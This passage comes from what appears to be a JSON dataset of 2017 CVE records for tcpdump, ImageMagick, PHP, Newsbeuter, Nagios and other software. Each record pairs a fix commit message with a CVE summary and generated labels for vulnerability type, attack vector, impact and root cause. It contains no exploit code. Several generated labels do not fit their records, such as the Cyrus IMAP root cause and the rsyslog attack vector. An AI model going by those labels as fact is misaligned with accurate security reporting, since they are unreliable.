we've processed\nso far, including what we're processing right now\", so the pointer can't\npoint to itself (as that's what we're processing right now).\n\nThis fixes an infinite loop discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).\n\nAlso, add some infinite-pointer-loop captures.\n\nMore checks should be done.  We might, for example, want to make sure\nthe upper 2 bits of the label length\/pointer byte are 00 or 11, and that\nif we encounter a pointer and jump backwards to what we think is a label\nthe label ends before the beginning of the last label we processed, to\nmake sure the pointer doesn't point backwards into the *middle* of a\nlabel, and also make sure the entire name is <= 255 bytes long.","summary":"The DNS parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-domain.c:ns_print().","commit_message_1":"<cve_id>\/check for dns compression pointer that do n't point backwards","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending specially crafted data","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ffde45acf3348f8353fb4064a1b21683ee6b5ddf","cve_id":"CVE-2017-12994","cwe_id":"CWE-125","commit_message":"CVE-2017-12994\/BGP: Move a test inside a loop.\n\nThe loop can be executed more than once (that's kinda the whole point of\na loop), so the check has to be made each time through the loop, not\njust once before the loop is executed.\n\nDo some additional length checks while we're at it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().","commit_message_1":"move a test inside a loop","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"b534e304568585707c4a92422aeca25cf908ff02","cve_id":"CVE-2017-12993","cwe_id":"CWE-125","commit_message":"CVE-2017-12993\/Juniper: Add more bounds checks.\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The Juniper protocols parser in tcpdump before 4.9.2 has a buffer over-read in print-juniper.c, several functions.","commit_message_1":"add more bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"e942fb84fbe3a73a98a00d2a279425872b5fb9d2","cve_id":"CVE-2017-12992","cwe_id":"CWE-125","commit_message":"CVE-2017-12992\/RIPng: Clean up bounds checking.\n\nDo bounds checking as we access items.\n\nScan the list of netinfo6 entries based on the supplied packet length,\nwithout taking the captured length into account; let the aforementioned\nbounds checking handle that.\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RIPng parser in tcpdump before 4.9.2 has a buffer over-read in print-ripng.c:ripng_print().","commit_message_1":"clean up bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"50a44b6b8e4f7c127440dbd4239cf571945cc1e7","cve_id":"CVE-2017-12991","cwe_id":"CWE-125","commit_message":"CVE-2017-12991\/BGP: Add missing bounds check.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:bgp_attr_print().","commit_message_1":"add missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"c2ef693866beae071a24b45c49f9674af1df4028","cve_id":"CVE-2017-12990","cwe_id":"CWE-835","commit_message":"CVE-2017-12990\/Fix printing of ISAKMPv1 Notification payload data.\n\nThe closest thing to a specification for the contents of the payload\ndata is draft-ietf-ipsec-notifymsg-04, and nothing in there says that it\nis ever a complete ISAKMP message, so don't dissect types we don't have\nspecific code for as a complete ISAKMP message.\n\nWhile we're at it, fix a comment, and clean up printing of V1 Nonce,\nV2 Authentication payloads, and v2 Notice payloads.\n\nThis fixes an infinite loop discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ISAKMP parser in tcpdump before 4.9.2 could enter an infinite loop due to bugs in print-isakmp.c, several functions.","commit_message_1":"<cve_id>\/fix printing of isakmpv1 notification payload data","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending specially crafted data","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"db24063b01cba8e9d4d88b7d8ac70c9000c104e4","cve_id":"CVE-2017-12989","cwe_id":"CWE-835","commit_message":"CVE-2017-12989\/RESP: Make sure resp_get_length() advances the pointer for invalid lengths.\n\nMake sure that it always sends *endp before returning and that, for\ninvalid lengths where we don't like a character in the length string,\nwhat it sets *endp to is past the character in question, so we don't\nrun the risk of infinitely looping (or doing something else random) if a\ncharacter in the length is invalid.\n\nThis fixes an infinite loop discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The RESP parser in tcpdump before 4.9.2 could enter an infinite loop due to a bug in print-resp.c:resp_get_length().","commit_message_1":"make sure resp_get_length ( ) advance the pointer for invalid length","Vulnerability Type":"Infinite Loop","Attack Vector":"By sending specially crafted data","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8934a7d6307267d301182f19ed162563717e29e3","cve_id":"CVE-2017-12988","cwe_id":"CWE-125","commit_message":"CVE-2017-12988\/TELNET: Add a missing bounds check.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The telnet parser in tcpdump before 4.9.2 has a buffer over-read in print-telnet.c:telnet_parse().","commit_message_1":"add a missing bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"66df248b49095c261138b5a5e34d341a6bf9ac7f","cve_id":"CVE-2017-12985","cwe_id":"CWE-125","commit_message":"CVE-2017-12985\/IPv6: Check for print routines returning -1 when running past the end.\n\nrt6_print(), ah_print(), and esp_print() return -1 if they run up\nagainst the end of the packet while dissecting; if that happens, stop\ndissecting, don't try to fetch the next header value, because 1) *it*\nmight be past the end of the packet and 2) we won't be using it in any\ncase, as we'll be exiting the loop.\n\nAlso, change mobility_print() to return -1 if it runs up against the\nend of the packet, and stop dissecting if it does so.\n\nThis fixes a buffer over-read discovered by Brian 'geeknik' Carpenter.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The IPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-ip6.c:ip6_print().","commit_message_1":"check for print routine returning -<number> when running past the end","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"baf0c1ad4572daa89caa3b12985bdd93530f0dd7","cve_id":"CVE-2017-12982","cwe_id":"CWE-119","commit_message":"bmp_read_info_header(): reject bmp files with biBitCount == 0 (#983)","summary":"The bmp_read_info_header function in bin\/jp2\/convertbmp.c in OpenJPEG 2.2.0 does not reject headers with a zero biBitCount, which allows remote attackers to cause a denial of service (memory allocation failure) in the opj_image_create function in lib\/openjp2\/image.c, related to the opj_aligned_alloc_n function in opj_malloc.c.","commit_message_1":"bmp_read_info_header ( ) : reject bmp file with bibitcount == <number> ( # <number> )","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service ( memory allocation failure ) in the opj _ image _ create function in lib \/ openjp2 \/ image . c , related to the opj _ aligned _ alloc _ n function in opj _ malloc . c .","Root Cause":"does not reject headers with a zero bibitcount","Attack Type":"remote attacker"},{"commit_id":"1a23ebc1fff59bf480ca92963b36eba5c1b904c4","cve_id":"CVE-2017-12932","cwe_id":"CWE-416","commit_message":"Fixed bug #74103 and bug #75054\n\nDirectly fail unserialization when trying to acquire an r\/R\nreference to an UNDEF HT slot. Previously this left an UNDEF and\nlater deleted the index\/key from the HT.\n\nWhat actually caused the issue here is a combination of two\nfactors: First, the key deletion was performed using the hash API,\nrather than the symtable API, such that the element was not actually\nremoved if it used an integral string key. Second, a subsequent\ndeletion operation, while collecting trailing UNDEF ranges, would\nmark the element as available for reuse (leaving a corrupted HT\nstate with nNumOfElemnts > nNumUsed).\n\nFix this by failing early and dropping the deletion code.","summary":"ext\/standard\/var_unserializer.re in PHP 7.0.x through 7.0.22 and 7.1.x through 7.1.8 is prone to a heap use after free while unserializing untrusted data, related to improper use of the hash API for key deletion in a situation with an invalid array size. Exploitation of this issue can have an unspecified impact on the integrity of PHP.","commit_message_1":"fixed bug # <number> and bug # <number> directly fail unserialization when trying to acquire an r\/r reference to an undef ht slot","Vulnerability Type":"Use After Free","Attack Vector":"improper use of the hash API for key deletion in a situation with an invalid array size","Impact":"have an unspecified impact","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"96e9506ae9e252c548665152d1b8968297128307","cve_id":"CVE-2017-12904","cwe_id":"CWE-943","commit_message":"Sanitize inputs to bookmark-cmd (#591)\n\nNewsbeuter didn't properly shell-escape the arguments passed to\nbookmarking command, which allows a remote attacker to perform remote\ncode execution by crafting an RSS item whose title and\/or URL contain\nsomething interpretable by the shell (most notably subshell\ninvocations.)\n\nThis has been reported by Jeriko One <jeriko.one@gmx.us>, complete with\nPoC and a patch.\n\nThis vulnerability was assigned CVE-2017-12904.","summary":"Improper Neutralization of Special Elements used in an OS Command in bookmarking function of Newsbeuter versions 0.7 through 2.9 allows remote attackers to perform user-assisted code execution by crafting an RSS item that includes shell code in its title and\/or URL.","commit_message_1":"sanitize input to bookmark-cmd ( # <number> ) newsbeuter did n't properly shell-escape the argument passed to bookmarking command , which allows a remote attacker to perform remote code execution by crafting an r item whose title and\/or url contain something interpretable by the shell ( most notably subshell invocation","Vulnerability Type":"Improper Neutralization of Special Elements in Data Query Logic","Attack Vector":"by crafting an rss item that includes shell code in its title and \/ or url","Impact":"perform user - assisted code execution","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"d17507ffa3e9742199b02a66aa940e79ababfa30","cve_id":"CVE-2017-12902","cwe_id":"CWE-125","commit_message":"CVE-2017-12902\/Zephyr: Fix bounds checking.\n\nUse ND_TTEST() rather than comparing against ndo->ndo_snapend ourselves;\nit's easy to get the tests wrong.\n\nCheck for running out of packet data before checking for running out of\ncaptured data, and distinguish between running out of packet data (which\nmight just mean \"no more strings\") and running out of captured data\n(which means \"truncated\").\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The Zephyr parser in tcpdump before 4.9.2 has a buffer over-read in print-zephyr.c, several functions.","commit_message_1":"fix bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"de981e6070d168b58ec1bb0713ded77ed4ad87f4","cve_id":"CVE-2017-12901","cwe_id":"CWE-125","commit_message":"CVE-2017-12901\/EIGRP: Do more length checks.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The EIGRP parser in tcpdump before 4.9.2 has a buffer over-read in print-eigrp.c:eigrp_print().","commit_message_1":"do more length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"0318fa8b61bd6c837641129d585f1a73c652b1e0","cve_id":"CVE-2017-12900","cwe_id":"CWE-125","commit_message":"CVE-2017-12900\/Properly terminate all struct tok arrays.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"Several protocol parsers in tcpdump before 4.9.2 could cause a buffer over-read in util-print.c:tok2strbuf().","commit_message_1":"<cve_id>\/properly terminate all struct tok array","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by a buffer overread memory","Attack Type":"remote attacker"},{"commit_id":"19d25dd8781620cd41bf178a5e2e27fc1cf242d0","cve_id":"CVE-2017-12898","cwe_id":"CWE-125","commit_message":"CVE-2017-12898\/NFS: Fix bounds checking.\n\nFix the bounds checking for the NFSv3 WRITE procedure to check whether the\nlength of the opaque data being written is present in the captured data,\nnot just whether the byte count is present in the captured data.\nfurthest forward in the packet, not the item before it.  (This also lets\nus eliminate the check for the \"stable\" argument being present in the\ncaptured data; rewrite the code to print that to make it a bit clearer.)\n\nCheck that the entire ar_stat field is present in the capture.\n\nNote that parse_wcc_attr() is called after we've already checked whether\nthe wcc_data is present.\n\nCheck before fetching the \"access\" part of the NFSv3 ACCESS results.\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nInclude a test for the \"check before fetching the \"access\" part...\" fix,\nusing the capture supplied by the reporter(s).","summary":"The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:interp_reply().","commit_message_1":"fix bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"1dcd10aceabbc03bf571ea32b892c522cbe923de","cve_id":"CVE-2017-12897","cwe_id":"CWE-125","commit_message":"CVE-2017-12897\/ISO CLNS: Use ND_TTEST() for the bounds checks in isoclns_print().\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nDon't pass the remaining caplen - that's too hard to get right, and we\nwere getting it wrong in at least one case; just use ND_TTEST().\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ISO CLNS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isoclns_print().","commit_message_1":"use nd_ttest ( ) for the bound check in isoclns_print ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"2b62d1dda41590db29368ec7ba5f4faf3464765a","cve_id":"CVE-2017-12895","cwe_id":"CWE-125","commit_message":"CVE-2017-12895\/ICMP: Check the availability of data before checksumming it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The ICMP parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp.c:icmp_print().","commit_message_1":"check the availability of data before checksumming it","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"730fc35968c5433b9e2a829779057f4f9495dc51","cve_id":"CVE-2017-12894","cwe_id":"CWE-125","commit_message":"CVE-2017-12894\/In lookup_bytestring(), take the length of the byte string into account.\n\nOtherwise, if, in our search of the hash table, we come across a byte\nstring that's shorter than the string we're looking for, we'll search\npast the end of the string in the hash table.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"Several protocol parsers in tcpdump before 4.9.2 could cause a buffer over-read in addrtoname.c:lookup_bytestring().","commit_message_1":"<cve_id>\/in lookup_bytestring ( ) , take the length of the byte string into account","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by a buffer overread memory","Attack Type":"remote attacker"},{"commit_id":"6f5ba2b651cd9d4b7fa8ee5c4f94460645877c45","cve_id":"CVE-2017-12893","cwe_id":"CWE-125","commit_message":"CVE-2017-12893\/SMB\/CIFS: Add a bounds check in name_len().\n\nAfter we advance the pointer by the length value in the buffer, make\nsure it points to something in the captured data.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The SMB\/CIFS parser in tcpdump before 4.9.2 has a buffer over-read in smbutil.c:name_len().","commit_message_1":"add a bound check in name_len ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by a buffer overread memory","Attack Type":"remote attacker"},{"commit_id":"04178de2247e353fc095846784b9a10fefdbf890","cve_id":"CVE-2017-12877","cwe_id":"CWE-416","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/662","summary":"Use-after-free vulnerability in the DestroyImage function in image.c in ImageMagick before 7.0.6-6 allows remote attackers to cause a denial of service via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e","cve_id":"CVE-2017-12876","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/663\nhttps:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/655","summary":"Heap-based buffer overflow in enhance.c in ImageMagick before 7.0.6-6 allows remote attackers to cause a denial of service via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"2217022b7d1142738656d891e00b3d2d9179b796","cve_id":"CVE-2017-12858","cwe_id":"CWE-415","commit_message":"Fix double free().\n\nFound by Brian 'geeknik' Carpenter using AFL.","summary":"Double free vulnerability in the _zip_dirent_read function in zip_dirent.c in libzip allows attackers to have unspecified impact via unknown vectors.","commit_message_1":"fix double free ( )","Vulnerability Type":"double free","Attack Vector":"have unspecified attack vector","Impact":"have unspecified impact","Root Cause":"A double free vulnerability","Attack Type":"attacker"},{"commit_id":"1b197346d490df2e2d3b1dcce5ac6134ad0c8752","cve_id":"CVE-2017-12847","cwe_id":"CWE-665","commit_message":"halfway revert hack\/configure changes - switch order of daemon_init\/drop_privileges","summary":"Nagios Core before 4.3.3 creates a nagios.lock PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for nagios.lock modification before a root script executes a *kill `cat \/pathname\/nagios.lock`* command.","commit_message_1":"halfway revert hack\/configure change - switch order of daemon_init\/drop_privileges","Vulnerability Type":"Improper Initialization","Attack Vector":"by leveraging access to this non - root account for nagios . lock modification before a root script executes a * kill ` cat \/ pathname \/ nagios . lock ` * command .","Impact":"kill arbitrary processes","Root Cause":"creates a nagios . lock pid file after dropping privileges to a non - root account , which","Attack Type":"local attacker"},{"commit_id":"5edadcfb83bf27107578830801817f9e6d0ad941","cve_id":"CVE-2017-12843","cwe_id":"CWE-20","commit_message":"dlist: don't allow overwrite of arbitrary files","summary":"Cyrus IMAP before 3.0.3 allows remote authenticated users to write to arbitrary files via a crafted (1) SYNCAPPLY, (2) SYNCGET or (3) SYNCRESTORE command.","commit_message_1":"dlist : do n't allow overwrite of arbitrary file","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted syncapply , syncget or syncrestore command","Impact":"write to arbitrary files","Root Cause":"caused by improper validation of channel geometry","Attack Type":"remote attacker"},{"commit_id":"3d5ac8c20846871f1eb3068b65f93da7cd33bfd0","cve_id":"CVE-2017-12669","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/571","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteCALSImage in coders\/cals.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"560e6e512961008938aa1d1b9aab06347b1c8f9b","cve_id":"CVE-2017-12668","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/575","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePCXImage in coders\/pcx.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"8985ed08f01d465ee65ab5a106186b3868b6f601","cve_id":"CVE-2017-12667","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/553","summary":"ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadMATImage in codersmat.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"45aeda5da9eb328689afc221fa3b7dfa5cdea54d","cve_id":"CVE-2017-12666","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/572","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteINLINEImage in coders\/inline.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"859084b4fd966ac007965c3d85caabccd8aee9b4","cve_id":"CVE-2017-12665","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/577","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePICTImage in coders\/pict.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"db1ffb6cf44bcfe5c4d5fcf9d9109ded5617387f","cve_id":"CVE-2017-12664","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/574","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePALMImage in coders\/palm.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"6233ef75bb973745ab1092b59aea8fe316f09074","cve_id":"CVE-2017-12663","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/573","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteMAPImage in coders\/map.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"73a2bad43d157acfe360595feee739b4cc4406cb","cve_id":"CVE-2017-12662","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/576","summary":"ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePDFImage in coders\/pdf.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"9f375e7080a2c1044cd546854d0548b4bfb429d0","cve_id":"CVE-2017-12644","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/551","summary":"ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadDCMImage in codersdcm.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"9eedb5660f1704cde8e8cd784c5c2a09dd2fd60f","cve_id":"CVE-2017-12643","cwe_id":"CWE-770","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/549","summary":"ImageMagick 7.0.6-1 has a memory exhaustion vulnerability in ReadOneJNGImage in coderspng.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Allocation of Resources Without Limits or Throttling","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"3320955045e5a2a22c13a04fa9422bb809e75eda","cve_id":"CVE-2017-12641","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/550","summary":"ImageMagick 7.0.6-1 has a memory leak vulnerability in ReadOneJNGImage in coderspng.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"78d4c5db50fbab0b4beb69c46c6167f2c6513dec","cve_id":"CVE-2017-12640","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/542","summary":"ImageMagick 7.0.6-1 has an out-of-bounds read vulnerability in ReadOneMNGImage in coders\/png.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"ad527a64f93dca12f6aabab2ca99ae5eb352ab4b","cve_id":"CVE-2017-12595","cwe_id":"CWE-20","commit_message":"Parse iteratively to avoid stack overflow (fixes #146)","summary":"The tokenizer in QPDF 6.0.0 and 7.0.b1 is recursive for arrays and dictionaries, which allows remote attackers to cause a denial of service (stack consumption and segmentation fault) or possibly have unspecified other impact via a PDF document with a deep data structure, as demonstrated by a crash in QPDFObjectHandle::parseInternal in libqpdf\/QPDFObjectHandle.cc.","commit_message_1":"parse iteratively to avoid stack overflow ( fix # <number> )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a pdf document with a deep data structure , as demonstrated by a crash in qpdfobjecthandle : : parseinternal in libqpdf \/ qpdfobjecthandle . cc","Impact":"cause a denial of service ( stack consumption and segmentation fault ) or possibly have unspecified other impact","Root Cause":"caused by a stack consumption flaw","Attack Type":"remote attacker"},{"commit_id":"062d0c671a29f7c6f7dff4a2f1f35df375bbb30b","cve_id":"CVE-2017-12588","cwe_id":"CWE-134","commit_message":"Merge pull request #1565 from Whissi\/fix-format-security-issue-in-zmq-modules\n\nFix format security issue in zmq3 modules","summary":"The zmq3 input and output modules in rsyslog before 8.28.0 interpreted description fields as format strings, possibly allowing a format string attack with unspecified impact.","commit_message_1":"merge pull request # <number> from whissi\/fix-format-security-issue-in-zmq-modules","Vulnerability Type":"format string","Attack Vector":"execute arbitrary code on the system","Impact":"execute arbitrary code ","Root Cause":"caused by a format string error","Attack Type":"remote attacker"},{"commit_id":"4d3f0bebd5f8518fd775f671c12bea58c68e814e","cve_id":"CVE-2017-12476","cwe_id":"CWE-476","commit_message":"fixed possible crashes on malformed inputs.","summary":"The AP4_AvccAtom::InspectFields function in Core\/Ap4AvccAtom.cpp in Bento4 mp4dump before 1.5.0-616 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted mp4 file.","commit_message_1":"fixed possible crash on malformed input","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted mp4 file","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"e793eb203e5e0f91f5037aed6585e81b1e27395b","cve_id":"CVE-2017-12427","cwe_id":"CWE-772","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/636","summary":"The ProcessMSLScript function in coders\/msl.c in ImageMagick before 6.9.9-5 and 7.x before 7.0.6-5 allows remote attackers to cause a denial of service (memory leak) via a crafted file, related to the WriteMSLImage function.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"memory leak","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak flaw","Attack Type":"remote attacker"},{"commit_id":"ea6789980fdaa610d7eb63602c746bf6ec70cd2b","cve_id":"CVE-2017-12193","cwe_id":"CWE-476","commit_message":"assoc_array: Fix a buggy node-splitting case\n\nThis fixes CVE-2017-12193.\n\nFix 